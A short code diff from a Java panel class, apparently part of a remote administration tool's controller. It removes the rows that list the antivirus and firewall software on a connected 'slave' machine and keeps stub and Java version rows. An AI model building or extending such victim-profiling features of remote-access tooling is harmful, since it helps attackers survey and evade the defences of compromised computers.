@@ -132,37 +132,5 @@ public class PanelControlComputerInfo extends PanelControlParent {
 		addRow("key", "Stub Version", slave.getVersion());
 		addRow("java", "Java Version", slave.getJavaVersion());
 		addRow("java", "Java Path", slave.getJavaPath());
-
-		String antiviruses = "";
-
-		if (slave.getAntiviruses().length == 1) {
-			antiviruses = slave.getAntiviruses()[0].getName();
-		} else {
-			for (int i = 0; i < slave.getAntiviruses().length; i++) {
-				if (i == slave.getAntiviruses().length - 1) {
-					antiviruses += slave.getAntiviruses()[i].getName();
-				} else {
-					antiviruses += slave.getAntiviruses()[i].getName() + ", ";
-				}
-			}
-		}
-
-		addRow("flame", "Antiviruses", antiviruses);
-
-		String firewalls = "";
-
-		if (slave.getFirewalls().length == 1) {
-			firewalls = slave.getFirewalls()[0].getName();
-		} else {
-			for (int i = 0; i < slave.getFirewalls().length; i++) {
-				if (i == slave.getFirewalls().length - 1) {
-					firewalls += slave.getFirewalls()[i].getName();
-				} else {
-					firewalls += slave.getFirewalls()[i].getName() + ", ";
-				}
-			}
-		}
-
-		addRow("firewall", "Firewalls", firewalls);
 	}
 }
